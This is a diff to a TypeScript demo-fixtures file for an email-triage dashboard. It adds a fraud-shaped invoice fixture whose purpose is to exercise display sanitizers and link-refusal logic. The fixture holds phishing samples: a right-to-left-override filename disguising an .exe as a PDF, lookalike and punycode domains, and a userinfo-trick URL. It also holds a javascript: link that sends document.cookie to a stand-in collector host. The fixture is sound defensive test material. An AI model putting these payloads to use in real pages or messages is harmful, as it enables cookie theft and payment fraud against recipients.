@@ -1,5 +1,6 @@
 import type {
   DashboardWidget,
+  ManualPayload,
   Profile,
   Todo,
   TodoPayload,
@@ -22,6 +23,113 @@ import type {
 
 const now = Date.now();
 const minutesAgo = (m: number) => new Date(now - m * 60_000).toISOString();
+
+/*
+  U+202E RIGHT-TO-LEFT OVERRIDE, written as a code point rather than pasted in.
+  A literal one is invisible in a diff, does not survive a copy-paste, and gets
+  stripped by half the tools that touch this file — which would quietly delete
+  the only fixture that proves sanitizeDisplay() works.
+
+  Used once, in t12, to build the filename attack: everything after it renders
+  right-to-left, so `INV-4471-remittance<RLO>fdp.exe` reads on screen as
+  `INV-4471-remittanceexe.pdf` and the reader decides about an executable he was
+  shown as a PDF. Escaping does nothing about it — the bytes are innocent and
+  the glyph order is the payload.
+*/
+const RLO = String.fromCharCode(0x202e);
+
+/*
+  The payload behind t12, written once and used for both `payload_proposed` and
+  `payload_current`.
+
+  Every fixture above it writes that pair out twice, because a DRAFT can
+  genuinely diverge: /api/act moves a modified row on and the box rewrites
+  `payload_current` while `payload_proposed` is never overwritten, so the two
+  really are different data. A manual item nobody has modified has no such
+  divergence to represent, and writing sixty lines out twice would only create
+  somewhere for the two copies to drift apart.
+*/
+const hostilePayload: ManualPayload = {
+  from: "acme.billing.dept@gmail.com",
+  // Not labelled by this build, so it lands in the unlabelled-key sweep at the
+  // bottom of the panel — which is exactly where the reader can see the two
+  // halves that `sender_domain_mismatch` is a comparison between.
+  reply_to: "remit@acme-billing-secure.example",
+  task: "The message asks for the remittance account on INV-4471 to be changed before Friday's run. Nothing has been actioned. Check the account with Acme on a number you already have before anything is paid.",
+  subject: "URGENT: updated remittance details for INV-4471",
+  email_id: "19a7f0c31d84be22",
+  email_flags: [
+    "attachment_received",
+    "pdf_attachment",
+    "external_links",
+    "external_sender",
+    "free_mailbox_sender",
+    "sender_domain_mismatch",
+    // Unrecognised on purpose. It has no label in this build, so it renders as
+    // NO flag and surfaces in the unlabelled-key sweep instead. Remove it and
+    // the default-deny stops being demonstrable.
+    "possible_invoice_fraud",
+  ],
+  attachments: [
+    {
+      // Reads as `INV-4471-remittanceexe.pdf` if nothing strips the override.
+      // sanitizeDisplay() removes it, so the card shows the real spelling and
+      // the real extension.
+      filename: `INV-4471-remittance${RLO}fdp.exe`,
+      // Declares application/pdf and is classified `other` anyway: `kind` comes
+      // from what the box measured in the bytes, never from the name or the
+      // declared type, so neither the icon nor the badge can be talked into
+      // saying PDF.
+      mime_type: "application/pdf",
+      size_bytes: 1_468_006,
+      kind: "other",
+    },
+    {
+      filename: "Acme_letterhead.png",
+      mime_type: "image/png",
+      size_bytes: 96_400,
+      kind: "image",
+    },
+  ],
+  /*
+    The link design in one card. Each row is a different refusal, and every one
+    of them still shows where it goes, because a link nobody can inspect is
+    worse than a link nobody can click.
+  */
+  links: [
+    // Plainly external and well formed: it passes the check, and STILL does not
+    // become an anchor until the reader presses the button.
+    {
+      url: "https://acme-industrial.example/contact",
+      title: "Acme contact page",
+    },
+    // The title says one company; the host is a different registered domain
+    // entirely. The host is the headline for exactly this reason.
+    {
+      url: "https://acme-billing.verify-invoice-portal.example/pay/INV-4471",
+      title: "Acme secure payment portal",
+    },
+    // Refused on scheme. React rewrites javascript: hrefs in production and
+    // does nothing to data:, vbscript: or file:, so the allowlist is what is
+    // actually holding here.
+    {
+      url: "javascript:document.location='https://collect.example/'+document.cookie",
+      title: "Click here to confirm receipt",
+    },
+    // Refused on userinfo. Everything before the @ is a username; this lands on
+    // pay-verify.example, not on accounts.example.com.
+    {
+      url: "https://accounts.example.com@pay-verify.example/reset",
+      title: "Verify your account",
+    },
+    // Refused as an internationalised host. Displayed in punycode, which is
+    // ugly and is the point: the readable spelling imitates another domain.
+    {
+      url: "https://xn--pypal-4ve.example/invoice/4471",
+      title: "Secure invoice checkout",
+    },
+  ],
+};
 
 export const demoTodos: Todo[] = [
   {
@@ -179,6 +287,39 @@ export const demoTodos: Todo[] = [
     attention: "action_soon",
     attention_reason: "The quote expires at the end of the week.",
   },
+  /*
+    The item this whole surface exists for: the supplier-invoice fraud shape.
+
+    `manual`, not `draft_email`, and that is the important half. Confirming a
+    manual item only marks it done, so the demo never shows Dovis offering to
+    write a reply to a suspected fraud — which would be the product endorsing
+    the message by proposing to answer it.
+
+    Its facts and its attachments agree with each other, because a fixture whose
+    flags contradict its own contents is the worst possible advertisement for a
+    feature whose entire claim is that the flags describe what actually arrived.
+
+    Note what the flags are NOT. Every one of them is a header or a MIME fact.
+    Nothing here says scam, phishing or suspicious: the card hands over the
+    gmail.com address, the disagreeing Reply-To, the executable dressed as a
+    PDF and the address the payment link really goes to, and the reader does the
+    judging. The attention block above the panel is where a judgement lives, and
+    it is deliberately a separate mechanism with a separate look.
+  */
+  {
+    id: "t12",
+    title: "Update the bank details on invoice INV-4471 before Friday's payment run",
+    action_type: "manual",
+    status: "proposed",
+    priority: "high",
+    source: "email",
+    created_at: minutesAgo(12),
+    confirmed_at: null,
+    completed_at: null,
+    attention: "urgent",
+    attention_reason:
+      "A payment run is scheduled for Friday and this asks for the account to be changed first.",
+  },
 ];
 
 export const demoPayloads: Record<string, TodoPayload> = {
@@ -321,6 +462,31 @@ export const demoPayloads: Record<string, TodoPayload> = {
       deadline: "2026-09-11",
       email_id: "18f2c9a4b7e01d33",
       location: "Building B, meeting room 2 (2F)",
+      // An ordinary message with ordinary attachments, which is the case the
+      // panel has to look calm for. The .xlsx carries the legacy declared type
+      // Excel still writes, disagreeing with its own extension — a mismatch is
+      // inspectable, not automatically alarming, and nothing flags it.
+      email_flags: ["attachment_received", "image_attachment", "external_sender"],
+      attachments: [
+        {
+          filename: "agenda-photo.jpg",
+          mime_type: "image/jpeg",
+          size_bytes: 184_320,
+          kind: "image",
+        },
+        {
+          filename: "委員名冊.xlsx",
+          mime_type: "application/vnd.ms-excel",
+          size_bytes: 24_576,
+          kind: "other",
+        },
+      ],
+      links: [
+        {
+          url: "https://dorm.example.edu.tw/committee/2026-09-11",
+          title: "Meeting details and floor plan",
+        },
+      ],
     },
     payload_current: {
       from: "dorm.office@example.edu.tw",
@@ -330,6 +496,31 @@ export const demoPayloads: Record<string, TodoPayload> = {
       deadline: "2026-09-11",
       email_id: "18f2c9a4b7e01d33",
       location: "Building B, meeting room 2 (2F)",
+      // An ordinary message with ordinary attachments, which is the case the
+      // panel has to look calm for. The .xlsx carries the legacy declared type
+      // Excel still writes, disagreeing with its own extension — a mismatch is
+      // inspectable, not automatically alarming, and nothing flags it.
+      email_flags: ["attachment_received", "image_attachment", "external_sender"],
+      attachments: [
+        {
+          filename: "agenda-photo.jpg",
+          mime_type: "image/jpeg",
+          size_bytes: 184_320,
+          kind: "image",
+        },
+        {
+          filename: "委員名冊.xlsx",
+          mime_type: "application/vnd.ms-excel",
+          size_bytes: 24_576,
+          kind: "other",
+        },
+      ],
+      links: [
+        {
+          url: "https://dorm.example.edu.tw/committee/2026-09-11",
+          title: "Meeting details and floor plan",
+        },
+      ],
     },
     modify_note: null,
     reject_reason: null,
@@ -365,6 +556,37 @@ export const demoPayloads: Record<string, TodoPayload> = {
       subject: "Q4 stationery — quote for approval",
       received_at: "2026-09-05T08:14:00+08:00",
       cc_count: 4,
+      email_flags: [
+        "attachment_received",
+        "pdf_attachment",
+        "external_links",
+        "external_sender",
+      ],
+      attachments: [
+        {
+          filename: "Q4-stationery-quote.pdf",
+          mime_type: "application/pdf",
+          size_bytes: 245_760,
+          kind: "pdf",
+        },
+        // Dovis saw a part and could not record it. The row stays, at reduced
+        // emphasis, because hiding the failure would silently rewrite what the
+        // message contained — the reader would be told there was one attachment
+        // when there were two.
+        {
+          filename: "price-list-appendix.pdf",
+          mime_type: "application/pdf",
+          size_bytes: null,
+          kind: "pdf",
+          unavailable: true,
+        },
+      ],
+      links: [
+        {
+          url: "https://supplies.example.com/quotes/Q4-2026",
+          title: "View the full quote",
+        },
+      ],
     },
     payload_current: {
       from: "supplies@example.com",
@@ -372,7 +594,60 @@ export const demoPayloads: Record<string, TodoPayload> = {
       subject: "Q4 stationery — quote for approval",
       received_at: "2026-09-05T08:14:00+08:00",
       cc_count: 4,
+      email_flags: [
+        "attachment_received",
+        "pdf_attachment",
+        "external_links",
+        "external_sender",
+      ],
+      attachments: [
+        {
+          filename: "Q4-stationery-quote.pdf",
+          mime_type: "application/pdf",
+          size_bytes: 245_760,
+          kind: "pdf",
+        },
+        // Dovis saw a part and could not record it. The row stays, at reduced
+        // emphasis, because hiding the failure would silently rewrite what the
+        // message contained — the reader would be told there was one attachment
+        // when there were two.
+        {
+          filename: "price-list-appendix.pdf",
+          mime_type: "application/pdf",
+          size_bytes: null,
+          kind: "pdf",
+          unavailable: true,
+        },
+      ],
+      links: [
+        {
+          url: "https://supplies.example.com/quotes/Q4-2026",
+          title: "View the full quote",
+        },
+      ],
     },
+    modify_note: null,
+    reject_reason: null,
+  },
+  /*
+    The hostile fixture. Everything in it is a FACT the box could establish
+    without reading a word of the prose, and the whole point is that the facts
+    are enough — nobody has to be told this is fraud to see what it is.
+
+    It carries a code this build does not recognise, `possible_invoice_fraud`,
+    on purpose. It has no label here, so it renders NOTHING as a flag: a chip
+    with no words would be a warning that cannot name itself, and printing the
+    code would hand whoever influenced the analyser a headline on the boss's
+    dashboard. It surfaces instead in the unlabelled-key sweep at the bottom of
+    the panel, which is where data nobody has a word for belongs. Remove it from
+    this fixture and the default-deny stops being demonstrable.
+  */
+  t12: {
+    todo_id: "t12",
+    // One object under both keys, unlike every fixture above it — see the
+    // comment on hostilePayload for why this pair has nothing to diverge.
+    payload_proposed: hostilePayload,
+    payload_current: hostilePayload,
     modify_note: null,
     reject_reason: null,
   },
@@ -386,7 +661,7 @@ export const demoWidgets: DashboardWidget[] = [
     position: 0,
     // Counts the proposed items above. The band and the headline read as one
     // sentence, so a stale number here reads as a broken dashboard.
-    config: { kind: "metric", value: "7", caption: "of 31 handled since 06:00" },
+    config: { kind: "metric", value: "8", caption: "of 31 handled since 06:00" },
   },
   {
     id: "w2",
